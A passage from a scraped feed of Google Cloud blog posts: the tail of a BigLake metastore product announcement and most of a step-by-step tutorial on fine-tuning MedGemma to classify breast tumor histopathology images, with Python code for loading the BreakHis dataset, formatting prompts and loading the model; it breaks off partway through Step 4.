\n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">With BigLake metastore, you can enjoy the following benefits:</span></p>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Unified metadata: </strong><span style=\"vertical-align: baseline;\">Shared runtime metadata across various engines, data formats and modalities, so you can understand and process the same underlying data without needing proprietary connectors or data copies. This enables data engineers to share the same data across multiple engines, leading to faster time to market for their key use cases.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Open APIs for interoperability</strong><span style=\"vertical-align: baseline;\">: Supports interoperability with open-source and third-party engines through Iceberg REST Catalog, so different teams can use their preferred analytics tools on a single, unified dataset.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Broad storage support: </strong><span style=\"vertical-align: baseline;\">Integrated</span><span style=\"vertical-align: baseline;\"> access and processing with data stored in Cloud Storage or BigQuery, helping you maximize data utility and maintain flexible storage without moving or copying data. </span><strong style=\"vertical-align: baseline;\"> </strong></li>\n<li><strong style=\"vertical-align: baseline;\">Serverless: </strong><span style=\"vertical-align: baseline;\">Reduced TCO due to serverless and no-ops environments and scalability for any workload size.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Enterprise readiness and scale: </strong><span style=\"vertical-align: baseline;\">Backed by Google’s planet-scale infrastructure and Spanner, so your metadata can scale with your data. There’s also support for Cloud Storage Dual Region and Multi-Region buckets for data and catalog redundancy.</span></li>\n<li><strong style=\"vertical-align: baseline;\">AI-powered governance: </strong><span style=\"vertical-align: baseline;\">End-to-end governance complete with comprehensive lineage, data quality, and discoverability capabilities for BigLake Iceberg tables in BigQuery, and integrated with </span><a href=\"https://cloud.google.com/dataplex/docs/catalog-overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Dataplex Universal Catalog</span></a><span style=\"vertical-align: baseline;\">.</span></li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">Unlock new AI use cases with your data lakehouse</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Google’s Data Cloud is built on Google's vast infrastructure and powered by AI, offering a unified platform for AI-ready data. This allows you to build </span><a href=\"https://cloud.google.com/solutions/data-lakehouse\"><span style=\"vertical-align: baseline;\">open lakehouse architecture</span></a><span style=\"vertical-align: baseline;\">s designed to handle both structured and multimodal data, so you can unlock new AI use cases. </span><span style=\"vertical-align: baseline;\">W</span><span style=\"vertical-align: baseline;\">ith BigLake and BigLake metastore, you can enable richer AI processing on your Iceberg data using BigQuery AI functions for text generation, text or unstructured data analysis, and translation. These functions access Gemini and partner LLM models available from Vertex AI, Cloud AI APIs, or built-in BigQuery models. Further, you can train, evaluate, and run ML models like linear regression, k-means clustering, or time-series forecasts directly on your Iceberg data using BigQuery ML.</span></p>\n<p><span style=\"vertical-align: baseline;\">Let’s take an example. Imagine you’re a data engineer at a large retail company, and a data analyst wants to access a product returns table to view a list of returned products. Some of the returns data is inserted into an Iceberg table by a data scientist on the Marketing team using Spark. Spark uses BigLake metastore Iceberg REST Catalog as the Catalog for the Iceberg table. Then, with the help of the Iceberg REST Catalog, the data scientist can immediately analyze the returns data, using BigQuery to list the returned products, BigQuery’s AI Generate function to describe the products, and BigQuery ML to plot a logistic regression model for the returns. The whole process is fast thanks to the use of the Cloud Storage FileIO implementation (</span><a href=\"https://iceberg.apache.org/javadoc/1.7.0/org/apache/iceberg/gcp/gcs/GCSFileIO.html\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">GCSFileIO</span></a><span style=\"vertical-align: baseline;\">), while Dataplex Universal Catalog provides governance capabilities for BigLake Iceberg tables in BigQuery.  </span></p>\n<h3><strong style=\"vertical-align: baseline;\">Learn more</strong></h3>\n<p><span style=\"vertical-align: baseline;\">With BigLake metastore, you now have a fully-managed, serverless, and scalable runtime metastore, enabling an open and interoperable lakehouse for your organization. </span><span style=\"vertical-align: baseline;\">Get started with </span><a href=\"https://docs.cloud.google.com/biglake/docs/introduction\"><span style=\"text-decoration: underline; vertical-align: baseline;\">BigLake metastore</span></a><span style=\"vertical-align: baseline;\"> and the </span><a href=\"https://docs.cloud.google.com/biglake/docs/blms-rest-catalog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Iceberg REST Catalog</span></a><span style=\"vertical-align: baseline;\"> today. And to learn how to build an AI-ready lakehouse with Apache Iceberg and BigLake, watch our most recent </span><a href=\"https://cloudonair.withgoogle.com/events/build-ai-ready-lakehouse-with-apache-iceberg\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">lakehouse webinar</span></a><span style=\"vertical-align: baseline;\"> on demand where we dive deeper into the topic.</span></p></div>",
        "published_date": "2025-11-19 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/developers-practitioners/a-step-by-step-guide-to-fine-tuning-medgemma-for-breast-tumor-classification/",
        "title": "A step-by-step guide to fine-tuning MedGemma for breast tumor classification",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/finetuning-medgemma_E41UPBs.max-600x600.png",
        "author": "Shir Meir Lador",
        "track": null,
        "description": "<div class=\"block-aside\"><dl>\n    <dt>aside_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;title&#x27;, &#x27;Disclaimer:  This guide is for informational and educational purposes only and is not a substitute for professional medical advice, diagnosis, or treatment.&#x27;), (&#x27;body&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f5bc57d0f10&gt;), (&#x27;btn_text&#x27;, &#x27;&#x27;), (&#x27;href&#x27;, &#x27;&#x27;), (&#x27;image&#x27;, None)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Artificial intelligence (AI) is revolutionizing healthcare, but how do you take a powerful, general-purpose AI model and teach it the specialized skills of a pathologist? This journey from prototype to production often begins in a notebook, which is exactly where we'll start.</span></p>\n<p><span style=\"vertical-align: baseline;\">In this guide, we'll take the crucial first step. We'll walk through the complete process of </span><a href=\"https://cloud.google.com/vertex-ai/docs/generative-ai/models/tune-models?utm_campaign=CDR_0x91b1edb5_default_b450564662&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">fine-tuning</span></a> the Gemma 3 variant <em><a href=\"https://deepmind.google/models/gemma/medgemma/\" rel=\"noopener\" target=\"_blank\">MedGemma</a></em>. MedGemma is <span style=\"vertical-align: baseline;\">Google's family of open models for the medical community, to classify breast cancer histopathology images. <span style=\"vertical-align: baseline;\">We're using the full precision MedGemma model because that's what you'll need in order to get maximum performance for many clinical tasks. If you're concerned about compute costs, you can quantize and fine-tune by using </span><a href=\"https://github.com/Google-Health/medgemma/blob/main/notebooks/fine_tune_with_hugging_face.ipynb\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">MedGemma's pre-configured fine-tuning notebook</span></a><span style=\"vertical-align: baseline;\"> instead.</span></span></p>\n<p><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">To complete our first step, we'll use the </span><a href=\"https://github.com/GoogleCloudPlatform/devrel-demos/blob/finetune_medgemma/ai-ml/finetune_medgemma/finetune_notebook.ipynb\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Finetune Notebook</span></a><span style=\"vertical-align: baseline;\">. </span>The notebook provides you with all of the code and a step-by-step explanation of the process, so it's<span style=\"vertical-align: baseline;\"> the perfect environment for experimentation</span>. I'll also share the key insights that I learned along the way, including a critical choice in data types that made all the difference. </span></p>\n<p><span style=\"vertical-align: baseline;\">After we've perfected our model in this prototyping phase, we'll be ready for the next step. In an upcoming post</span><span style=\"vertical-align: baseline;\">, we'll show you how to take this exact workflow and move it to a scalable, production-ready environment using </span><a href=\"https://cloud.google.com/run/docs/create-jobs?utm_campaign=CDR_0x91b1edb5_default_b450564662&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Cloud Run jobs</span></a>.</p>\n<h2><span style=\"vertical-align: baseline;\">Setting the stage: Our goal, model, and data</span></h2>\n<p><span style=\"vertical-align: baseline;\">Before we get to the code, let's set the stage. </span><span style=\"vertical-align: baseline;\">Our goal is to classify microscope images of breast tissue into one of eight categories: four benign (non-cancerous) and four malignant (cancerous). This type of classification represents one of many crucial tasks that pathologists perform in order to make an accurate diagnosis, and we have a great set of tools for the job.</span></p>\n<p><span style=\"vertical-align: baseline;\">We'll be using </span><a href=\"https://deepmind.google/models/gemma/medgemma/\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">MedGemma</strong></a><span style=\"vertical-align: baseline;\">,</span><span style=\"vertical-align: baseline;\"> a powerful family of open models from Google that's built on the same research and technology that powers our Gemini models. What makes MedGemma special is that it isn't just a general model: it's been specifically tuned for the medical domain.</span></p>\n<p><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">The MedGemma vision component, </span><a href=\"https://developers.google.com/health-ai-developer-foundations/medsiglip\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">MedSigLIP</span></a><span style=\"vertical-align: baseline;\">, was pre-trained on a vast amount of de-identified medical imagery, including the exact type of histopathology slides that we're using. If you don't need the predictive power of MedGemma, you can use MedSigLIP alone as a more cost-effective option for predictive tasks like image classification. There are multiple </span><a href=\"https://github.com/Google-Health/medsiglip/tree/main/notebooks\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">MedSigLIP tutorial notebooks</span></a><span style=\"vertical-align: baseline;\"> that you can use for fine-tuning.</span></span></p>\n<p><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">The MedGemma language component was also trained on a diverse set of medical texts, making the </span><a href=\"https://huggingface.co/google/medgemma-4b-it\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">google/medgemma-4b-it</strong></a><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">version that we're using perfect for following our text-based prompts. Google provides MedGemma as a strong foundation, but it requires fine-tuning for specific use cases—which is exactly what we're about to do.</span></span></p>\n<p><span style=\"vertical-align: baseline;\">To train our model, we'll use the </span><a href=\"https://web.inf.ufpr.br/vri/databases/breast-cancer-histopathological-database-breakhis/\" rel=\"noopener\" target=\"_blank\">Breast Cancer Histopathological Image Classification (BreakHis) dataset</a>. The BreakHis dataset is <span style=\"vertical-align: baseline;\">a public collection of thousands of microscope images of breast tumor tissue that was collected from 82 patients using different magnifying factors (40X, 100X, 200X, and 400X). The dataset is publicly available for non-commercial research and it's detailed in the paper: F. A. Spanhol, L. S. Oliveira, C. Petitjean, and L. Heudel, <em><a href=\"https://web.inf.ufpr.br/vri/databases/breast-cancer-histopathological-database-breakhis/\" rel=\"noopener\" target=\"_blank\">A dataset for breast cancer histopathological image classification</a></em>.<sup>1</sup></span></p>\n<p><span style=\"vertical-align: baseline;\">Handling a </span><strong style=\"vertical-align: baseline;\">4-billion</strong><span style=\"vertical-align: baseline;\"> parameter model requires a capable GPU, so I used an </span><strong style=\"vertical-align: baseline;\">NVIDIA A100 </strong><span style=\"vertical-align: baseline;\">with</span><strong style=\"vertical-align: baseline;\"> 40 GB</strong><span style=\"vertical-align: baseline;\"> of </span><strong style=\"vertical-align: baseline;\">VRAM</strong><span style=\"vertical-align: baseline;\"> on</span><strong style=\"vertical-align: baseline;\"> </strong><a href=\"https://cloud.google.com/vertex-ai-notebooks?utm_campaign=CDR_0x91b1edb5_default_b450564662&amp;utm_medium=external&amp;utm_source=blog\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Vertex AI Workbench</strong></a><span style=\"vertical-align: baseline;\">. This GPU has the necessary power, and it also features </span><a href=\"https://www.nvidia.com/en-us/data-center/tensor-cores/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">NVIDIA Tensor Cores</span></a><span style=\"vertical-align: baseline;\"> that excel with modern data formats, which we'll leverage for faster training. In an upcoming post, we'll explain </span><span style=\"vertical-align: baseline;\">how to calculate the VRAM that's required for your fine tuning.</span></p>\n<h3><span style=\"vertical-align: baseline;\">My </span><span style=\"vertical-align: baseline;\">float16</span><span style=\"vertical-align: baseline;\"> disaster: A crucial lesson in stability</span></h3>\n<p><span style=\"vertical-align: baseline;\">My first attempt to load the model used the common float16 </span><span style=\"vertical-align: baseline;\">data type to save memory. It failed spectacularly. The model's outputs were complete garbage, and a quick debugging check revealed that every internal value had collapsed into </span><a href=\"https://en.wikipedia.org/wiki/NaN\" rel=\"noopener\" target=\"_blank\"><span style=\"vertical-align: baseline;\">NaN</span></a><span style=\"vertical-align: baseline;\"><a href=\"https://en.wikipedia.org/wiki/NaN\" rel=\"noopener\" target=\"_blank\"> (Not a Number)</a>.</span></p>\n<p><span style=\"vertical-align: baseline;\">The culprit was a classic </span><strong style=\"vertical-align: baseline;\">numerical overflow</strong><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">To understand why, you need to know the critical difference between these 16-bit formats:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://en.wikipedia.org/wiki/Half-precision_floating-point_format\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">float16</strong></a><strong style=\"vertical-align: baseline;\"> (FP16)</strong><span style=\"vertical-align: baseline;\"><strong>:</strong> Has a tiny numerical range. It can't represent any number that's greater than 65,504. During the millions of calculations in a transformer, intermediate values can easily exceed this limit, causing an overflow that creates a </span><span style=\"vertical-align: baseline;\">NaN</span><span style=\"vertical-align: baseline;\">. When a </span><span style=\"vertical-align: baseline;\">NaN</span><span style=\"vertical-align: baseline;\"> appears, it contaminates every subsequent calculation.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/blog/products/ai-machine-learning/bfloat16-the-secret-to-high-performance-on-cloud-tpus\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">bfloat16</strong></a><strong style=\"vertical-align: baseline;\"> (BF16)</strong><span style=\"vertical-align: baseline;\"><strong>:</strong> This format, developed at Google Brain, makes a crucial trade-off. It sacrifices a little bit of precision to maintain the </span><strong style=\"vertical-align: baseline;\">same massive numerical range</strong><span style=\"vertical-align: baseline;\"> as the full 32-bit </span><span style=\"vertical-align: baseline;\">float32</span><span style=\"vertical-align: baseline;\"> format.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">The bfloat16 massive range prevents overflows, which keeps the training process stable. The fix was a simple one-line change, but it was based on this critical concept.</span></p>\n<p><strong style=\"vertical-align: baseline;\">The successful code:</strong></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;# The simple, stable solution\\r\\nmodel_kwargs = dict(\\r\\n    torch_dtype=torch.bfloat16,  # Use bfloat16 for its wide numerical range\\r\\n    device_map=&quot;auto&quot;,\\r\\n    attn_implementation=&quot;sdpa&quot;,\\r\\n)\\r\\n\\r\\nmodel = AutoModelForImageTextToText.from_pretrained(MODEL_ID, **model_kwargs)&#x27;), (&#x27;language&#x27;, &#x27;lang-py&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f5bba700d00&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><strong style=\"vertical-align: baseline;\">Lesson learned:</strong><span style=\"vertical-align: baseline;\"> For fine-tuning large models, always prefer </span><strong style=\"vertical-align: baseline;\">bfloat16</strong><span style=\"vertical-align: baseline;\"> for its stability. It's a small change that saves you from a world of </span><span style=\"vertical-align: baseline;\">NaN</span><span style=\"vertical-align: baseline;\">-related headaches.</span></p>\n<h2><span style=\"vertical-align: baseline;\">The code walkthrough: A step-by-step guide</span></h2>\n<p><span style=\"vertical-align: baseline;\">Now, let's get to the code. I'll break down my </span><a href=\"https://github.com/GoogleCloudPlatform/devrel-demos/blob/finetune_medgemma/ai-ml/finetune_medgemma/finetune_notebook.ipynb\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Finetune Notebook</span></a><span style=\"vertical-align: baseline;\"> into clear, logical steps.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Step 1: Setup and installations</span></h3>\n<p><span style=\"vertical-align: baseline;\">First, you need to install the necessary libraries from the Hugging Face ecosystem and log into your account to download the model.</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;# Install required packages\\r\\n!pip install --upgrade --quiet transformers datasets evaluate peft trl scikit-learn\\r\\n\\r\\nimport os\\r\\nimport re\\r\\nimport torch\\r\\nimport gc\\r\\nfrom datasets import load_dataset, ClassLabel\\r\\nfrom peft import LoraConfig, PeftModel\\r\\nfrom transformers import AutoModelForImageTextToText, AutoProcessor\\r\\nfrom trl import SFTTrainer, SFTConfig\\r\\nimport evaluate&#x27;), (&#x27;language&#x27;, &#x27;lang-py&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f5bba700a90&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Hugging Face authentication and and the </span><strong style=\"vertical-align: baseline;\">recommended</strong><span style=\"vertical-align: baseline;\"> approach to handle your secrets</span></h4>\n<p><strong style=\"vertical-align: baseline;\">⚠️ Important security note: </strong><span style=\"vertical-align: baseline;\">You should never hardcode secrets like API keys or tokens directly into your code or notebooks, especially in a production environment. This practice is insecure and it creates a significant security risk.</span></p>\n<p><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">In Vertex AI Workbench, t</span>he most secure and enterprise-grade approach to handle secrets (like your Hugging Face token) is to use Google Cloud's </span><a href=\"https://docs.cloud.google.com/secret-manager/docs/creating-and-accessing-secrets\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Secret Manger</span></a>.</p>\n<p><span style=\"vertical-align: baseline;\">If you're just experimenting and you don't want to set up Secret Manager yet, you can use the interactive login widget. The widget saves the token temporarily in the instance's file system.</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;# Hugging Face authentication using interactive login widget:\\r\\nfrom huggingface_hub import notebook_login\\r\\nnotebook_login()&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f5bba700fd0&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">In our upcoming post,</span><span style=\"vertical-align: baseline;\"> where we move this process to Cloud Run Jobs, we'll show you the correct and secure way to handle this token by using Secret Manager</span><span style=\"vertical-align: baseline;\">.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Step 2: Load and prepare the dataset</span></h2>\n<p><span style=\"vertical-align: baseline;\">Next, we download the <a href=\"https://www.kaggle.com/datasets/ambarish/breakhis\" rel=\"noopener\" target=\"_blank\">BreakHis dataset from Kaggle</a> using the <code>kagglehub</code> library. <span style=\"vertical-align: baseline;\">This dataset includes a </span><code style=\"vertical-align: baseline;\">Folds.csv</code><span style=\"vertical-align: baseline;\"> file, which outlines how the data is split for experiments. The original study used 5-fold cross-validation, but to keep the training time manageable for this demonstration, we'll focus on Fold 1 and we'll only use images with 100X magnification. You can explore using other folds and magnifications for more extensive experiments.</span></span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;! pip install -q kagglehub\\r\\nimport kagglehub\\r\\nimport os\\r\\nimport pandas as pd\\r\\nfrom PIL import Image\\r\\nfrom datasets import Dataset, Image as HFImage, Features, ClassLabel\\r\\n\\r\\n# Download the dataset metadata\\r\\npath = kagglehub.dataset_download(&quot;ambarish/breakhis&quot;)\\r\\nprint(&quot;Path to dataset files:&quot;, path)\\r\\nfolds = pd.read_csv(\\&#x27;{}/Folds.csv\\&#x27;.format(path))\\r\\n\\r\\n# Filter for 100X magnification from the first fold\\r\\nfolds_100x = folds[folds[\\&#x27;mag\\&#x27;]==100]\\r\\nfolds_100x = folds_100x[folds_100x[\\&#x27;fold\\&#x27;]==1]\\r\\n\\r\\n# Get the train/test splits\\r\\nfolds_100x_test = folds_100x[folds_100x.grp==\\&#x27;test\\&#x27;]\\r\\nfolds_100x_train = folds_100x[folds_100x.grp==\\&#x27;train\\&#x27;]\\r\\n\\r\\n# Define the base path for images\\r\\nBASE_PATH = &quot;/home/jupyter/.cache/kagglehub/datasets/ambarish/breakhis/versions/4/BreaKHis_v1&quot;&#x27;), (&#x27;language&#x27;, &#x27;lang-py&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f5bba700f70&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Step 2.1: Balance the dataset</span></h2>\n<p><span style=\"vertical-align: baseline;\">The initial train and test splits for the 100X magnification show an imbalance between benign and malignant classes. To address this, we'll undersample the majority class in both the training and testing sets in order to create balanced datasets with a 50/50 distribution.</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;# --- 1. Create Balanced TRAIN Set ---\\r\\ntrain_benign_df = folds_100x_train[folds_100x_train[\\&#x27;filename\\&#x27;].str.contains(\\&#x27;benign\\&#x27;)]\\r\\ntrain_malignant_df = folds_100x_train[folds_100x_train[\\&#x27;filename\\&#x27;].str.contains(\\&#x27;malignant\\&#x27;)]\\r\\nmin_train_count = min(len(train_benign_df), len(train_malignant_df))\\r\\nbalanced_train_benign = train_benign_df.sample(n=min_train_count, random_state=42)\\r\\nbalanced_train_malignant = train_malignant_df.sample(n=min_train_count, random_state=42)\\r\\nbalanced_train_df = pd.concat([balanced_train_benign, balanced_train_malignant])\\r\\n\\r\\n# --- 2. Create Balanced TEST Set ---\\r\\ntest_benign_df = folds_100x_test[folds_100x_test[\\&#x27;filename\\&#x27;].str.contains(\\&#x27;benign\\&#x27;)]\\r\\ntest_malignant_df = folds_100x_test[folds_100x_test[\\&#x27;filename\\&#x27;].str.contains(\\&#x27;malignant\\&#x27;)]\\r\\nmin_test_count = min(len(test_benign_df), len(test_malignant_df))\\r\\nbalanced_test_benign = test_benign_df.sample(n=min_test_count, random_state=42)\\r\\nbalanced_test_malignant = test_malignant_df.sample(n=min_test_count, random_state=42)\\r\\nbalanced_test_df = pd.concat([balanced_test_benign, balanced_test_malignant])\\r\\n\\r\\n# --- 3. Get the Final Filename Lists ---\\r\\ntrain_filenames = balanced_train_df[\\&#x27;filename\\&#x27;].values\\r\\ntest_filenames = balanced_test_df[\\&#x27;filename\\&#x27;].values\\r\\n\\r\\nprint(f&quot;Balanced Train: {len(train_filenames)} files&quot;)\\r\\nprint(f&quot;Balanced Test: {len(test_filenames)} files&quot;)&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f5bba700be0&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Step 2.2: Create a Hugging Face dataset</span></h2>\n<p><span style=\"vertical-align: baseline;\">We're converting our data into the Hugging Face  </span><code style=\"vertical-align: baseline;\">datasets</code><span style=\"vertical-align: baseline;\"> format because it's the easiest way to work with the </span><code style=\"vertical-align: baseline;\">SFTTrainer</code><span style=\"vertical-align: baseline;\"> from their Transformers library. This format is optimized for handling large datasets, especially images, because it can load them efficiently when needed. And it gives us handy tools for preprocessing, like applying our formatting function to all examples.</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;CLASS_NAMES = [\\r\\n    \\&#x27;benign_adenosis\\&#x27;, \\&#x27;benign_fibroadenoma\\&#x27;, \\&#x27;benign_phyllodes_tumor\\&#x27;,\\r\\n    \\&#x27;benign_tubular_adenoma\\&#x27;, \\&#x27;malignant_ductal_carcinoma\\&#x27;,\\r\\n    \\&#x27;malignant_lobular_carcinoma\\&#x27;, \\&#x27;malignant_mucinous_carcinoma\\&#x27;,\\r\\n    \\&#x27;malignant_papillary_carcinoma\\&#x27;\\r\\n]\\r\\n\\r\\ndef get_label_from_filename(filename):\\r\\n     filename = filename.replace(\\&#x27;\\\\\\\\\\&#x27;, \\&#x27;/\\&#x27;).lower()\\r\\n     if \\&#x27;/adenosis/\\&#x27; in filename: return 0\\r\\n     if \\&#x27;/fibroadenoma/\\&#x27; in filename: return 1\\r\\n     if \\&#x27;/phyllodes_tumor/\\&#x27; in filename: return 2\\r\\n     if \\&#x27;/tubular_adenoma/\\&#x27; in filename: return 3\\r\\n     if \\&#x27;/ductal_carcinoma/\\&#x27; in filename: return 4\\r\\n     if \\&#x27;/lobular_carcinoma/\\&#x27; in filename: return 5\\r\\n     if \\&#x27;/mucinous_carcinoma/\\&#x27; in filename: return 6\\r\\n     if \\&#x27;/papillary_carcinoma/\\&#x27; in filename: return 7\\r\\n     return -1\\r\\n\\r\\ntrain_data_dict = {\\r\\n    \\&#x27;image\\&#x27;: [os.path.join(BASE_PATH, f) for f in train_filenames],\\r\\n    \\&#x27;label\\&#x27;: [get_label_from_filename(f) for f in train_filenames]\\r\\n}\\r\\ntest_data_dict = {\\r\\n    \\&#x27;image\\&#x27;: [os.path.join(BASE_PATH, f) for f in test_filenames],\\r\\n    \\&#x27;label\\&#x27;: [get_label_from_filename(f) for f in test_filenames]\\r\\n}\\r\\nfeatures = Features({\\r\\n    \\&#x27;image\\&#x27;: HFImage(),\\r\\n    \\&#x27;label\\&#x27;: ClassLabel(names=CLASS_NAMES)\\r\\n})\\r\\ntrain_dataset = Dataset.from_dict(train_data_dict, features=features).cast_column(&quot;image&quot;, HFImage())\\r\\neval_dataset = Dataset.from_dict(test_data_dict, features=features).cast_column(&quot;image&quot;, HFImage())\\r\\n\\r\\nprint(train_dataset)\\r\\nprint(eval_dataset)&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f5bba700880&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Step 3: Prompt engineering</span></h2>\n<p><span style=\"vertical-align: baseline;\">This step is where we tell the model what we want it to do. We create a clear, structured prompt that instructs the model to analyze an image and to return only the number that corresponds to a class. This prompt makes the output simple and easy to parse. We then map this format across our entire dataset.</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;# Define the instruction prompt\\r\\nPROMPT = &quot;&quot;&quot;Analyze this breast tissue histopathology image and classify it.\\r\\n\\r\\nClasses (0-7):\\r\\n0: benign_adenosis\\r\\n1: benign_fibroadenoma\\r\\n2: benign_phyllodes_tumor\\r\\n3: benign_tubular_adenoma\\r\\n4: malignant_ductal_carcinoma\\r\\n5: malignant_lobular_carcinoma\\r\\n6: malignant_mucinous_carcinoma\\r\\n7: malignant_papillary_carcinoma\\r\\n\\r\\nAnswer with only the number (0-7):&quot;&quot;&quot;\\r\\n\\r\\ndef format_data(example):\\r\\n    &quot;&quot;&quot;Format examples into the chat-style messages MedGemma expects.&quot;&quot;&quot;\\r\\n    example[&quot;messages&quot;] = [\\r\\n        {\\r\\n            &quot;role&quot;: &quot;user&quot;,\\r\\n            &quot;content&quot;: [\\r\\n                {&quot;type&quot;: &quot;image&quot;},\\r\\n                {&quot;type&quot;: &quot;text&quot;, &quot;text&quot;: PROMPT},\\r\\n            ],\\r\\n        },\\r\\n        {\\r\\n            &quot;role&quot;: &quot;assistant&quot;,\\r\\n            &quot;content&quot;: [\\r\\n                {&quot;type&quot;: &quot;text&quot;, &quot;text&quot;: str(example[&quot;label&quot;])},\\r\\n            ],\\r\\n        },\\r\\n    ]\\r\\n    return example\\r\\n\\r\\n# Apply formatting\\r\\nformatted_train = train_dataset.map(format_data, batched=False)\\r\\nformatted_eval = eval_dataset.map(format_data, batched=False)\\r\\n\\r\\nprint(&quot;✓ Data formatted with instruction prompts&quot;)&#x27;), (&#x27;language&#x27;, &#x27;lang-py&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f5bba700b20&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Step 4: Load the model and processor</span></h2>\n<p><span style=\"vertical-align: baseline;\">Here, we load the MedGemma model and its associated processor. The processor is a handy tool that prepares both the images and text for the model. We'll also make two key parameter choices for efficiency:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><code><strong style=\"vertical-align: baseline;\">torch_dtype=torch.bfloat16</strong></code><span style=\"vertical-align: baseline;\"><strong>:</strong> As we mentioned earlier, this format ensures numerical stability.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code><strong style=\"vertical-align: baseline;\">attn_implementation=\"sdpa\"</strong></code><span style=\"vertical-align: baseline;\"><strong>:</strong> </span><a href=\"https://docs.pytorch.org/docs/stable/generated/torch.nn.functional.scaled_dot_product_attention.html\" rel=\"noopener\" target=\"_blank\"><strong style=\"vertical-align: baseline;\">Scaled dot product attention</strong></a><span style=\"vertical-align: baseline;\"> is a highly 